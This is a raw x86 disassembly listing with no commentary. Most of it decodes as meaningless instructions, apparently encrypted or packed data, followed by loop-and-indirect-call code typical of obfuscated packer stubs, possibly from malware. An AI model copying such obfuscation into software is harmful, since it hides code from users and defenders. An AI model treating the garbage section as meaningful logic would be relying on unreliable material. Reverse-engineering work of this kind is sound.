  40482d:	in     eax,dx
  40482e:	aaa    
  40482f:	repz sub eax,0xb8a7f25
  404835:	cwde   
  404836:	rcl    eax,0xac
  404839:	pusha  
  40483a:	push   ebx
  40483b:	test   al,0x12
  40483d:	push   ecx
  40483e:	push   ds
  40483f:	or     BYTE PTR [esp+ecx*2+0x68],ah
  404843:	or     dh,BYTE PTR [edi+edx*2+0x7d]
  404847:	mov    cl,0xeb
  404849:	(bad)  
  40484a:	xlat   BYTE PTR ds:[ebx]
  40484b:	rcr    ch,0x58
  40484e:	sbb    bl,dl
  404850:	pop    edi
  404851:	mov    dl,0xf
  404853:	xchg   ebp,eax
  404854:	jecxz  0x404841
  404856:	sbb    dh,ch
  404858:	call   0x4e90d973
  40485d:	dec    esi
  40485e:	mov    edi,edx
  404860:	xchg   ecx,eax
  404861:	jl     0x40480a
  404863:	ret    
  404864:	sbb    BYTE PTR [eiz*4+0x396dbe89],cl
  40486b:	push   esp
  40486c:	xchg   esi,eax
  40486d:	sti    
  40486e:	test   BYTE PTR [esi+esi*1],0x84
  404872:	aas    
  404873:	mov    fs,WORD PTR [ebp+0x2c2b881e]
  404879:	call   0xa65aa29c
  40487e:	or     ah,BYTE PTR [ebx+0x19]
  404881:	xor    BYTE PTR [esi-0x5ae607f2],al
  404887:	dec    esp
  404888:	mov    ah,0x39
  40488a:	and    DWORD PTR [ecx],0x36
  40488d:	das    
  40488e:	jle    0x4048d1
  404890:	stc    
  404891:	push   esi
  404892:	loopne 0x4048ad
  404894:	les    esi,FWORD PTR [edi+eax*8+0x38]
  404898:	add    eax,0x60f46ca6
  40489d:	test   BYTE PTR [esi],bl
  40489f:	ret    0xb258
  4048a2:	jl     0x40488f
  4048a4:	into   
  4048a5:	or     eax,0x1ed444e5
  4048aa:	adc    eax,0xe69cc929
  4048af:	rcr    esp,1
  4048b1:	aas    
  4048b2:	out    0xa1,eax
  4048b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048b5:	cmc    
  4048b6:	lods   al,BYTE PTR ds:[esi]
  4048b7:	cmp    al,ch
  4048b9:	mov    ecx,0xa6b68927
  4048be:	fst    DWORD PTR [edx]
  4048c0:	mov    esp,0x774c6c2e
  4048c5:	vcvtsi2ss xmm7,xmm5,DWORD PTR [edi]
  4048c9:	into   
  4048ca:	xchg   ebx,eax
  4048cb:	fdiv   DWORD PTR [eax]
  4048cd:	retf   
  4048ce:	mov    al,ds:0xdfe99293
  4048d3:	adc    bh,BYTE PTR [ebx+0x3ccce7f3]
  4048d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048da:	into   
  4048db:	pop    ss
  4048dc:	retf   
  4048dd:	(bad)  
  4048de:	or     DWORD PTR [esi],esp
  4048e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048e1:	or     dl,cl
  4048e3:	or     al,0xbd
  4048e5:	call   0x79387812
  4048ea:	jmp    0xe4a38222
  4048ef:	cli    
  4048f0:	sti    
  4048f1:	xchg   edi,eax
  4048f2:	mov    ebx,0xafcad39
  4048f7:	mov    al,ds:0x5d180c71
  4048fc:	inc    ebp
  4048fd:	pusha  
  4048fe:	jmp    0x9ceba25c
  404903:	pop    ebx
  404904:	mov    BYTE PTR [ecx],ah
  404906:	bound  ecx,QWORD PTR [edi-0x41683dd9]
  40490c:	and    al,0x8b
  40490e:	dec    esp
  40490f:	push   cs
  404910:	mov    bh,0xad
  404912:	fisubr DWORD PTR [edx+0x7a]
  404915:	sub    al,0x89
  404917:	lahf   
  404918:	push   cs
  404919:	adc    BYTE PTR [ebx],dh
  40491b:	(bad)  
  40491c:	xchg   ebx,eax
  40491d:	jg     0x404945
  40491f:	sti    
  404920:	add    cl,0x6e
  404923:	icebp  
  404924:	adc    eax,0xdc13d4f
  404929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40492a:	nop
  40492b:	mov    al,0x64
  40492d:	(bad)  
  40492e:	cmc    
  40492f:	fstp   TBYTE PTR [esi]
  404931:	cdq    
  404932:	shl    DWORD PTR ds:0x653fe696,cl
  404938:	lahf   
  404939:	and    al,0x64
  40493b:	enter  0x1838,0x72
  40493f:	jo     0x4048fb
  404941:	mov    esp,0x46f26aac
  404946:	mov    esp,cs
  404948:	push   edx
  404949:	adc    ebp,DWORD PTR [eax]
  40494b:	jmp    0xae36:0x822c36eb
  404952:	push   ecx
  404953:	test   ebp,ecx
  404955:	in     al,dx
  404956:	enter  0x3a45,0x5f
  40495a:	js     0x404930
  40495c:	xchg   DWORD PTR es:[ebp+0x53e8c526],ebx
  404963:	mov    ch,0xa9
  404965:	add    DWORD PTR [ebx+0x60],ecx
  404968:	xchg   edi,eax
  404969:	movhps QWORD PTR [ecx+0x5c386927],xmm5
  404970:	ins    DWORD PTR es:[edi],dx
  404971:	sub    ah,0x71
  404974:	arpl   WORD PTR [edi-0x77f7ea8f],dx
  40497a:	loope  0x404975
  40497c:	mov    al,0xc2
  40497e:	leave  
  40497f:	sub    al,0x59
  404981:	sub    BYTE PTR [eax+0x46],bh
  404984:	mov    edx,0x7b6b7263
  404989:	lea    edi,[edx+0x5d]
  40498c:	ja     0x40499b
  40498e:	jl     0x4049d6
  404990:	icebp  
  404991:	xor    dh,BYTE PTR [eax+0x9]
  404994:	scas   al,BYTE PTR es:[edi]
  404995:	aad    0x5c
  404997:	test   DWORD PTR [ebx+0xe],esi
  40499a:	ins    DWORD PTR es:[edi],dx
  40499b:	dec    eax
  40499c:	stos   BYTE PTR es:[edi],al
  40499d:	(bad)  
  40499f:	and    esi,DWORD PTR [edx+0x6d1e0e72]
  4049a5:	mov    ds:0x11314424,al
  4049aa:	dec    edx
  4049ab:	xchg   DWORD PTR [ecx-0x67],edx
  4049ae:	xchg   BYTE PTR [edx+edi*2-0x3978d354],bl
  4049b5:	(bad)  
  4049b7:	adc    al,0x46
  4049b9:	xchg   BYTE PTR [ebx],ah
  4049bb:	popf   
  4049bc:	ins    BYTE PTR es:[edi],dx
  4049bd:	pusha  
  4049be:	dec    edx
  4049bf:	ins    BYTE PTR es:[edi],dx
  4049c0:	jae    0x404a01
  4049c2:	xchg   edi,ebp
  4049c4:	dec    ebx
  4049c5:	mov    ecx,0x9db2368d
  4049ca:	jbe    0x404a15
  4049cc:	popf   
  4049cd:	(bad)  
  4049cf:	fbld   TBYTE PTR [edx]
  4049d1:	push   esi
  4049d2:	lahf   
  4049d3:	into   
  4049d4:	push   edi
  4049d5:	mov    dh,bh
  4049d7:	aaa    
  4049d8:	jbe    0x4049ad
  4049da:	mov    edi,0xedf54505
  4049df:	pop    eax
  4049e0:	add    ebp,DWORD PTR [edx-0x1018d539]
  4049e6:	imul   esi,ecx,0xa28b68ba
  4049ec:	jmp    0x5eaa:0xf5c7815d
  4049f3:	out    dx,al
  4049f4:	cld    
  4049f5:	mov    eax,0x348ea379
  4049fa:	xchg   edx,eax
  4049fb:	ins    DWORD PTR es:[edi],dx
  4049fc:	fld    TBYTE PTR [eax-0x16]
  4049ff:	in     eax,dx
  404a00:	fs push 0x4e735550
  404a06:	push   cs
  404a07:	fldcw  WORD PTR [edi]
  404a09:	(bad)  
  404a0a:	jmp    0x404a15
  404a0c:	rol    DWORD PTR [esp+eiz*8-0x1716046e],1
  404a13:	mov    dl,0xba
  404a15:	icebp  
  404a16:	cmp    DWORD PTR [edx],0xffffffb7
  404a19:	or     eax,0x59313759
  404a1e:	ja     0x4049b0
  404a20:	fmul   st(2),st
  404a22:	pop    ebx
  404a23:	and    eax,esi
  404a25:	mov    WORD PTR [eax],cs
  404a27:	mov    esi,0x9508bfec
  404a2c:	test   DWORD PTR [edi],esp
  404a2e:	xchg   dl,bl
  404a30:	idiv   DWORD PTR [di+0x39]
  404a34:	aas    
  404a35:	mov    eax,ds:0x8fa5e90e
  404a3a:	call   0x4c83:0xbb2e647e
  404a41:	sti    
  404a42:	jo     0x4049e8
  404a44:	je     0x4049e9
  404a46:	mov    DWORD PTR [edx-0x1418e9b8],ecx
  404a4c:	int3   
  404a4d:	out    0xd,al
  404a4f:	dec    ebp
  404a50:	add    BYTE PTR [ecx],dl
  404a52:	lds    esi,FWORD PTR [esi+0x73e3fe3e]
  404a58:	dec    ebp
  404a59:	pop    eax
  404a5a:	sub    bl,BYTE PTR [eax]
  404a5c:	jg     0x404ab4
  404a5e:	nop
  404a5f:	dec    eax
  404a60:	addr16 test esp,edx
  404a63:	sbb    esp,DWORD PTR [eax-0xea81d8c]
  404a69:	mov    eax,0xea3c2291
  404a6e:	sbb    DWORD PTR [edi],eax
  404a70:	jmp    0x417d:0x99858424
  404a77:	leave  
  404a78:	inc    esi
  404a79:	gs repnz outs dx,BYTE PTR es:[esi]
  404a7d:	jmp    0xb1d1989d
  404a82:	xchg   edx,eax
  404a83:	clc    
  404a84:	cmp    DWORD PTR [eax-0x55376ef2],0xa5386c0a
  404a8e:	cmp    BYTE PTR [ecx-0x51594bfb],ah
  404a94:	add    DWORD PTR [ebx+edx*8-0x63],0xfffffff6
  404a99:	imul   ebx,DWORD PTR [esi+0x623a9529],0x68e60779
  404aa3:	imul   ecx,DWORD PTR [ebx+0x3691223d],0x7b
  404aaa:	sub    al,0x3d
  404aac:	and    ecx,eax
  404aae:	mov    edx,tr3
  404ab1:	sub    ah,ah
  404ab3:	jl     0x404a50
  404ab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ab6:	inc    esp
  404ab7:	sbb    ebx,eax
  404ab9:	dec    ebp
  404aba:	xor    BYTE PTR ds:0x71dd294a,al
  404ac0:	add    al,dh
  404ac2:	retf   
  404ac3:	jmp    0x8835893a
  404ac8:	or     ebp,DWORD PTR [esi]
  404aca:	sub    eax,0x687dfd7f
  404acf:	pop    ecx
  404ad0:	call   0x96334d82
  404ad5:	fnsave [esi]
  404ad7:	sub    eax,0xa1c60e65
  404adc:	mov    dh,0x7e
  404ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404adf:	out    dx,eax
  404ae0:	inc    ebp
  404ae1:	mov    eax,0x12006659
  404ae6:	out    0x60,al
  404ae8:	dec    esp
  404ae9:	das    
  404aea:	inc    edi
  404aeb:	dec    edx
  404aec:	jnp    0x404aa9
  404aee:	push   edx
  404aef:	es jp  0x404ae7
  404af2:	addr16 shr esi,cl
  404af5:	push   ss
  404af6:	add    BYTE PTR [ecx+0x7ee8be0e],ch
  404afc:	cmp    esp,esp
  404afe:	cmc    
  404aff:	inc    edi
  404b00:	je     0x404a9d
  404b02:	mov    ds:0xe24d1ce2,al
  404b07:	sub    bl,cl
  404b09:	push   ebp
  404b0a:	adc    bh,BYTE PTR [eax]
  404b0c:	fcmovbe st,st(3)
  404b0e:	pop    esi
  404b0f:	jg     0x404b21
  404b11:	cwde   
  404b12:	shr    DWORD PTR [ebx-0x1daa6ee6],cl
  404b18:	jl     0x404aa3
  404b1a:	es iret 
  404b1c:	xchg   esi,eax
  404b1d:	xchg   edx,eax
  404b1e:	pop    ss
  404b1f:	fdiv   DWORD PTR [eax-0x246a0828]
  404b25:	mov    bl,0x4b
  404b27:	icebp  
  404b28:	fcom   DWORD PTR [eax]
  404b2a:	clc    
  404b2b:	and    eax,ebp
  404b2d:	imul   DWORD PTR [esi-0x624d531b]
  404b33:	pop    edi
  404b34:	gs fwait
  404b36:	jnp    0x404bad
  404b38:	mov    al,0x1
  404b3a:	nop
  404b3b:	dec    ebp
  404b3c:	pop    edx
  404b3d:	sbb    BYTE PTR [ebx+0x70],dl
  404b40:	dec    ecx
  404b41:	(bad)  
  404b42:	cs ins BYTE PTR es:[edi],dx
  404b44:	hlt    
  404b45:	int3   
  404b46:	aaa    
  404b47:	xchg   al,bh
  404b49:	fisttp DWORD PTR [edx-0x4f]
  404b4c:	jnp    0x404b47
  404b4e:	push   ds
  404b4f:	cmc    
  404b50:	inc    edi
  404b51:	push   ss
  404b52:	xchg   edi,eax
  404b53:	and    eax,0xc360cfe1
  404b58:	jp     0x404b1b
  404b5a:	and    ecx,DWORD PTR [ebx+eiz*4]
  404b5d:	push   ecx
  404b5e:	test   DWORD PTR [edi-0x48587557],esi
  404b64:	push   eax
  404b65:	ret    
  404b66:	repnz pusha 
  404b68:	pop    ecx
  404b69:	adc    DWORD PTR [edx],ebp
  404b6b:	cmp    dh,BYTE PTR [esi+0x46]
  404b6e:	imul   BYTE PTR [ebx-0x5e629713]
  404b74:	pop    esi
  404b75:	sub    eax,0xb6e8de48
  404b7a:	imul   ebp,DWORD PTR [eax+eiz*8],0x66
  404b7e:	lods   eax,DWORD PTR ds:[esi]
  404b7f:	push   ebx
  404b80:	ret    
  404b81:	(bad)  
  404b82:	xchg   esp,eax
  404b83:	add    bh,dh
  404b85:	xor    eax,0x3eb268e1
  404b8a:	jb     0x404b2e
  404b8c:	out    0x7c,al
  404b8e:	repnz lds eax,FWORD PTR [edx+0x4e]
  404b92:	jo     0x404b7c
  404b94:	fwait
  404b95:	(bad)  
  404b96:	in     eax,dx
  404b97:	pop    ecx
  404b98:	outs   dx,DWORD PTR ds:[esi]
  404b99:	ds jle 0x404b1c
  404b9c:	adc    eax,0xace1b44d
  404ba1:	jae    0x404b83
  404ba3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ba4:	shr    DWORD PTR [edi],0x4
  404ba7:	(bad)  
  404ba8:	push   ss
  404ba9:	push   ebx
  404baa:	ret    0x6603
  404bad:	pop    ebx
  404bae:	sbb    al,0x1b
  404bb0:	jmp    0xd58ea8fc
  404bb5:	mov    bl,0x5c
  404bb7:	push   ebp
  404bb8:	test   BYTE PTR [ebx+eiz*1],dh
  404bbb:	push   esp
  404bbc:	addr16 loope 0x404b7e
  404bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bc0:	loope  0x404be8
  404bc2:	sub    dh,0x6f
  404bc5:	mov    eax,ds:0xb7f96816
  404bca:	pop    es
  404bcb:	sub    eax,0x2685f0e1
  404bd0:	push   0x7c
  404bd2:	sbb    DWORD PTR [edx+eax*2-0x3baf35ca],ebp
  404bd9:	(bad)  
  404bda:	sar    BYTE PTR [edx-0x7b248af7],1
  404be0:	out    0x2e,al
  404be2:	mov    bh,0x22
  404be4:	into   
  404be5:	xchg   DWORD PTR [eax+0x6f8eacc8],ebp
  404beb:	xchg   esp,eax
  404bec:	int    0x9b
  404bee:	or     al,0xd8
  404bf0:	pop    edx
  404bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bf2:	loop   0x404bab
  404bf4:	sysexit 
  404bf6:	std    
  404bf7:	fst    DWORD PTR [esi-0x2052ba87]
  404bfd:	adc    DWORD PTR [edi-0x6629ebf0],ecx
  404c03:	in     eax,0xb5
  404c05:	jne    0x404be8
  404c07:	je     0x404b8a
  404c09:	fs jne 0x404bd3
  404c0c:	(bad)  
  404c0d:	outs   dx,DWORD PTR ds:[esi]
  404c0e:	ror    ch,1
  404c10:	bound  edi,QWORD PTR [ecx-0x72]
  404c13:	pop    es
  404c14:	dec    edi
  404c15:	mov    edx,edx
  404c17:	sub    BYTE PTR ds:0x22dc37fc,0x16
  404c1e:	sahf   
  404c1f:	mov    ecx,0xe0a678de
  404c24:	out    dx,eax
  404c25:	aas    
  404c26:	xlat   BYTE PTR ds:[ebx]
  404c27:	inc    ebx
  404c28:	imul   edx,DWORD PTR [ecx],0x45fe484f
  404c2e:	push   edx
  404c2f:	dec    esi
  404c30:	popa   
  404c31:	add    dh,BYTE PTR [ecx]
  404c33:	mov    BYTE PTR [ebx-0x174943ec],bl
  404c39:	inc    esi
  404c3a:	adc    ebp,ebx
  404c3c:	fs int3 
  404c3e:	out    dx,al
  404c3f:	lds    edx,FWORD PTR [esi-0x7c64686]
  404c45:	dec    edi
  404c46:	pop    eax
  404c47:	shl    DWORD PTR [edx],0xdf
  404c4a:	mov    ebx,0xfae726ac
  404c4f:	adc    eax,0x76ccba9
  404c54:	aam    0x61
  404c56:	(bad)  
  404c57:	jo     0x404cd7
  404c59:	(bad)
  404c5c:	mov    ch,0x55
  404c5f:	sti    
  404c60:	repz xlat BYTE PTR ds:[ebx]
  404c62:	inc    eax
  404c63:	xor    DWORD PTR ds:0x5ae2faf4,esp
  404c69:	jl     0x404ca7
  404c6b:	push   eax
  404c6c:	push   edx
  404c6d:	clc    
  404c6e:	sbb    BYTE PTR [edx+edx*4-0xa],ah
  404c72:	or     eax,0xdc62fd0
  404c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c78:	sbb    al,ch
  404c7a:	mov    edx,ebx
  404c7c:	add    bl,al
  404c7e:	(bad)  
  404c7f:	fdivrp st(1),st
  404c81:	sub    BYTE PTR [eax],dl
  404c83:	je     0x404cab
  404c85:	aas    
  404c86:	jecxz  0x404c23
  404c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c89:	dec    edi
  404c8a:	jle    0x404c51
  404c8c:	lahf   
  404c8d:	xlat   BYTE PTR ds:[ebx]
  404c8e:	ds jcxz 0x404c1d
  404c92:	mov    esi,0x33d33f42
  404c97:	inc    edi
  404c98:	lods   al,BYTE PTR ds:[esi]
  404c99:	stos   DWORD PTR es:[edi],eax
  404c9a:	mov    ebp,0x924905a
  404c9f:	lods   al,BYTE PTR ds:[esi]
  404ca0:	mov    ch,0x50
  404ca2:	sbb    al,BYTE PTR [ecx]
  404ca4:	mov    ch,0x7a
  404ca6:	jge    0x404c7b
  404ca8:	sahf   
  404ca9:	jp     0x404c8a
  404cab:	pop    ecx
  404cac:	adc    eax,0xa6e423ad
  404cb1:	add    edx,esp
  404cb3:	jecxz  0x404c39
  404cb5:	jecxz  0x404c60
  404cb7:	cmp    BYTE PTR [esi+0x5718923d],cl
  404cbd:	pop    edx
  404cbe:	gs jecxz 0x404c71
  404cc1:	shr    DWORD PTR [esp+eax*8-0x26],0x86
  404cc6:	cmp    al,BYTE PTR [ecx+0xa]
  404cc9:	xor    ebx,DWORD PTR [eax+0x7a]
  404ccc:	jne    0x404ca7
  404cce:	aas    
  404ccf:	arpl   WORD PTR [esi-0x53],cx
  404cd2:	les    edx,FWORD PTR ds:0xb4274bcf
  404cd8:	jo     0x404c91
  404cda:	clc    
  404cdb:	xor    bl,BYTE PTR [esi]
  404cdd:	jge    0x404c8b
  404cdf:	xchg   ebx,eax
  404ce0:	pop    esp
  404ce1:	dec    edi
  404ce2:	in     eax,dx
  404ce3:	jb     0x404d22
  404ce5:	call   0xd07f:0x1f3cf701
  404cec:	mov    ecx,0x6613bddb
  404cf1:	sub    al,0x97
  404cf3:	mov    esp,DWORD PTR [eax+0x1d36cd39]
  404cf9:	clc    
  404cfa:	je     0x404d71
  404cfc:	loopne 0x404d00
  404cfe:	pop    eax
  404cff:	imul   esi,DWORD PTR [edx-0x29],0x4a2be2a0
  404d06:	pop    ebp
  404d07:	jge    0x404d20
  404d09:	jb     0x404d6d
  404d0b:	nop
  404d0c:	in     al,0x19
  404d0e:	ficom  DWORD PTR [esi+0x6fc1a199]
  404d14:	mov    dl,BYTE PTR [ebx]
  404d16:	neg    DWORD PTR [esi]
  404d18:	add    ebp,DWORD PTR [ebp-0x662550e9]
  404d1e:	(bad)  [eax-0x6beedea2]
  404d24:	mov    eax,0x46ae69a6
  404d29:	push   ebx
  404d2a:	test   DWORD PTR [edx],0x8d1acf25
  404d30:	or     al,0x6
  404d32:	test   eax,0xf82e5ec2
  404d37:	or     dl,BYTE PTR [edi-0x74c6ed55]
  404d3d:	(bad)  
  404d3e:	ins    DWORD PTR es:[edi],dx
  404d3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d40:	lods   eax,DWORD PTR ds:[esi]
  404d41:	xchg   edi,eax
  404d42:	jp     0x404d59
  404d44:	rcr    DWORD PTR [eax],1
  404d46:	call   0xd7ce5e7c
  404d4b:	xchg   edx,eax
  404d4c:	ud0    ebx,DWORD PTR [esi-0xda30871]
  404d53:	sub    BYTE PTR [esi+0x37af265c],bl
  404d59:	or     ebp,0x7e2b83d9
  404d5f:	push   0x8988af00
  404d64:	loope  0x404d75
  404d66:	inc    ebx
  404d67:	or     DWORD PTR [eax+0x3709c73],esi
  404d6d:	mov    ds:0x88ec042c,eax
  404d72:	mov    cl,BYTE PTR [eax+0x1e]
  404d75:	jne    0x404d63
  404d77:	jno    0x404d15
  404d79:	in     al,dx
  404d7a:	adc    DWORD PTR [ebx+eiz*1+0x666b3849],ebp
  404d81:	repnz cmc 
  404d83:	cmp    eax,0xf75a332d
  404d88:	jno    0x404d19
  404d8a:	add    eax,0x8315f805
  404d8f:	jo     0x404e08
  404d91:	loope  0x404d87
  404d93:	fsub   QWORD PTR [eax]
  404d95:	sbb    al,0x74
  404d97:	out    0x9,eax
  404d99:	lea    esi,[ebp+0x27]
  404d9c:	in     al,0x88
  404d9e:	mov    ecx,0x6dffebb7
  404da3:	inc    ebx
  404da4:	ja     0x404e09
  404da6:	into   
  404da7:	pop    ebx
  404da8:	inc    edx
  404da9:	jb     0x404da7
  404dab:	hlt    
  404dac:	jae    0x404e27
  404dae:	jns    0x404dce
  404db0:	mov    BYTE PTR [esi-0x5b],bh
  404db3:	aam    0x63
  404db5:	scas   al,BYTE PTR es:[edi]
  404db6:	push   0xffffffd0
  404db8:	(bad)  
  404db9:	(bad)  
  404dba:	fstp   DWORD PTR ds:0x5c071d3e
  404dc0:	adc    esp,DWORD PTR [ebx]
  404dc2:	fld    DWORD PTR [edi-0x7d]
  404dc5:	mov    ch,BYTE PTR [eax]
  404dc7:	sbb    eax,0x32047f11
  404dcc:	cmp    ebp,DWORD PTR [eax-0x31562895]
  404dd2:	adc    DWORD PTR [edx-0x752697a7],eax
  404dd8:	jo     0x404e2c
  404dda:	enter  0xd817,0x5f
  404dde:	mov    ds:0xdfb5b74a,eax
  404de3:	ja     0x404d6c
  404de5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404de6:	push   0x28b9303b
  404deb:	icebp  
  404dec:	fiadd  DWORD PTR [esi]
  404dee:	test   eax,0xbf52ef6f
  404df3:	xlat   BYTE PTR ds:[ebx]
  404df4:	push   cs
  404df5:	push   es
  404df6:	inc    esp
  404df7:	iret   
  404df8:	je     0x404ed6
  404dfe:	and    eax,DWORD PTR ds:0x42b010
  404e04:	mov    eax,DWORD PTR [ebp+0x14]
  404e07:	and    DWORD PTR ds:0x42901c,0x0
  404e11:	jmp    0x404e23
  404e16:	mov    ebx,DWORD PTR ds:0x42901c
  404e1c:	inc    ebx
  404e1d:	mov    DWORD PTR ds:0x42901c,ebx
  404e23:	cmp    DWORD PTR ds:0x42901c,0x11
  404e2a:	jae    0x404e6a
  404e30:	cmp    DWORD PTR ds:0x42901c,0x1a
  404e37:	jne    0x404e53
  404e3d:	push   DWORD PTR [ebp-0x18]
  404e40:	push   DWORD PTR [ebp-0x28]
  404e43:	push   0x42e0e0
  404e48:	push   0x400000
  404e4d:	call   DWORD PTR ds:0x42e8eb
  404e53:	jmp    0x404e16
  404e58:	mov    ebx,DWORD PTR ds:0x42a01c
  404e5e:	sub    ebx,DWORD PTR ds:0x42d008
  404e64:	mov    DWORD PTR ds:0x42a01c,ebx
  404e6a:	mov    eax,DWORD PTR [eax]
  404e6c:	and    DWORD PTR ds:0x42b01c,0x0
  404e76:	mov    ebx,DWORD PTR ds:0x42b01c
  404e7c:	inc    ebx
  404e7d:	mov    DWORD PTR ds:0x42b01c,ebx
  404e83:	cmp    DWORD PTR ds:0x42b01c,0x6
  404e8a:	jne    0x404e96
  404e90:	call   DWORD PTR ds:0x42e8ef
  404e96:	cmp    DWORD PTR ds:0x42b01c,0x5
  404e9d:	jne    0x404eb2
  404ea3:	xor    ebx,ebx
  404ea5:	or     ebx,DWORD PTR ds:0x42b01c
  404eab:	inc    ebx
  404eac:	mov    DWORD PTR ds:0x42b01c,ebx
  404eb2:	cmp    DWORD PTR ds:0x42b01c,0x12
  404eb9:	jb     0x404e76
  404ebf:	xor    ebx,ebx
  404ec1:	or     ebx,DWORD PTR ds:0x429000
  404ec7:	add    ebx,DWORD PTR ds:0x42d014
  404ecd:	mov    DWORD PTR ds:0x429000,ebx
  404ed3:	mov    DWORD PTR [ebp-0x1c],eax
  404ed6:	mov    eax,ds:0x41cd65
  404edb:	mov    ebx,DWORD PTR ds:0x41ce0c
  404ee1:	sub    ebx,eax
  404ee3:	or     eax,DWORD PTR [eax+ebx*1]
  404ee6:	mov    eax,DWORD PTR [ebp-0x4]
  404ee9:	mov    DWORD PTR ds:0x42900c,0x13
  404ef3:	cmp    DWORD PTR ds:0x42900c,0x0
  404efa:	je     0x404f3f
  404f00:	cmp    DWORD PTR ds:0x42900c,0xa
  404f07:	jne    0x404f13
  404f0d:	call   DWORD PTR ds:0x42e8f3
  404f13:	cmp    DWORD PTR ds:0x42900c,0xb
  404f1a:	jne    0x404f2d
  404f20:	mov    ebx,DWORD PTR ds:0x42900c
  404f26:	dec    ebx
  404f27:	mov    DWORD PTR ds:0x42900c,ebx
  404f2d:	mov    ebx,DWORD PTR ds:0x42900c
  404f33:	dec    ebx
  404f34:	mov    DWORD PTR ds:0x42900c,ebx
  404f3a:	jmp    0x404ef3
  404f3f:	xor    eax,esi
  404f41:	add    ebx,0x5bdd
  404f47:	add    eax,edi
  404f49:	mov    DWORD PTR [ebp-0x8],eax
  404f4c:	and    ebx,eax
  404f4e:	mov    eax,DWORD PTR [ebp-0xc]
  404f51:	sbb    DWORD PTR ds:0x42a000,ecx
  404f57:	xor    eax,esi
  404f59:	add    eax,edi
  404f5b:	and    DWORD PTR ds:0x42b018,0x0
  404f65:	mov    ebx,DWORD PTR ds:0x42b018
  404f6b:	inc    ebx
  404f6c:	mov    DWORD PTR ds:0x42b018,ebx
  404f72:	cmp    DWORD PTR ds:0x42b018,0x1f
  404f79:	jne    0x404f8a
  404f7f:	push   0x42e0ac
  404f84:	call   DWORD PTR ds:0x42e8f7
  404f8a:	cmp    DWORD PTR ds:0x42b018,0x12
  404f91:	jb     0x404f65
  404f97:	mov    DWORD PTR [ebp-0x24],eax
  404f9a:	mov    eax,DWORD PTR [ebp-0x4]
  404f9d:	xor    eax,esi
  404f9f:	add    eax,edi
  404fa1:	mov    DWORD PTR [ebp-0x30],eax
  404fa4:	mov    ebx,DWORD PTR [ebp-0x4]
  404fa7:	mov    eax,ds:0x41cd79
  404fac:	mov    eax,DWORD PTR [eax]
  404fae:	xor    DWORD PTR ds:0x42900c,eax
  404fb4:	xor    ebx,esi
  404fb6:	add    ebx,edi
  404fb8:	mov    DWORD PTR ds:0x42c01c,0x1a
  404fc2:	cmp    DWORD PTR ds:0x42c01c,0x0
  404fc9:	je     0x4050fc
  404fcf:	cmp    DWORD PTR ds:0x42c01c,0x3
  404fd6:	jne    0x404fe7
  404fdc:	push   0x42e018
  404fe1:	call   DWORD PTR ds:0x42e8fb
  404fe7:	cmp    DWORD PTR ds:0x42c01c,0x4
  404fee:	jne    0x404fff
  404ff4:	mov    eax,ds:0x42c01c
  404ff9:	dec    eax
  404ffa:	mov    ds:0x42c01c,eax
  404fff:	mov    eax,ds:0x42c01c
  405004:	dec    eax
  405005:	mov    ds:0x42c01c,eax
  40500a:	jmp    0x404fc2
  40500f:	mov    DWORD PTR ds:0x42b010,0x1e
  405019:	cmp    DWORD PTR ds:0x42b010,0x0
  405020:	je     0x4050fc
  405026:	cmp    DWORD PTR ds:0x42b010,0x29
  40502d:	jne    0x405039
  405033:	call   DWORD PTR ds:0x42e8ff
  405039:	mov    eax,ds:0x42b010
  40503e:	dec    eax
  40503f:	mov    ds:0x42b010,eax
  405044:	jmp    0x405019
  405049:	mov    DWORD PTR ds:0x42a004,0x16
  405053:	cmp    DWORD PTR ds:0x42a004,0x0
  40505a:	je     0x4050fc
  405060:	cmp    DWORD PTR ds:0x42a004,0xb
  405067:	jne    0x405082
  40506d:	push   0x6cef
  405072:	push   0x42a000
  405077:	push   0x4fd9
  40507c:	call   DWORD PTR ds:0x42e903
  405082:	cmp    DWORD PTR ds:0x42a004,0xc
  405089:	jne    0x40509a
  40508f:	mov    eax,ds:0x42a004
  405094:	dec    eax
  405095:	mov    ds:0x42a004,eax
  40509a:	mov    eax,ds:0x42a004
  40509f:	dec    eax
  4050a0:	mov    ds:0x42a004,eax
  4050a5:	jmp    0x405053
  4050aa:	mov    DWORD PTR ds:0x42901c,0x1f
  4050b4:	cmp    DWORD PTR ds:0x42901c,0x0
  4050bb:	je     0x4050fc
  4050c1:	cmp    DWORD PTR ds:0x42901c,0x22
  4050c8:	jne    0x4050e2
  4050ce:	push   DWORD PTR [ebp-0x1c]
  4050d1:	push   0x7ea8
  4050d6:	push   DWORD PTR [ebp-0x10]
  4050d9:	push   DWORD PTR [ebp-0x28]
  4050dc:	call   DWORD PTR ds:0x42e8c3
  4050e2:	mov    eax,ds:0x42901c
  4050e7:	dec    eax
  4050e8:	mov    ds:0x42901c,eax
  4050ed:	jmp    0x4050b4
  4050f2:	and    DWORD PTR ds:0x42d008,0x7d7b
  4050fc:	mov    eax,DWORD PTR [ebp-0x24]
  4050ff:	sub    eax,edi
  405101:	lea    ecx,[ebx-0x3272e2]
  405107:	and    DWORD PTR ds:0x42d00c,0x483b
  405111:	xor    eax,esi
  405113:	sub    DWORD PTR ds:0x42a000,0x7f75
  40511d:	xor    ecx,esi
  40511f:	cmp    ecx,eax
  405121:	mov    DWORD PTR ds:0x429010,0x207a
  40512b:	je     0x405268
  405131:	mov    eax,DWORD PTR [ebp-0x4]
  405134:	add    DWORD PTR ds:0x42a004,0x429018
  40513e:	xor    eax,esi
  405140:	add    eax,edi
  405142:	mov    DWORD PTR ds:0x42d010,0x65f6
  40514c:	cmp    ebx,eax
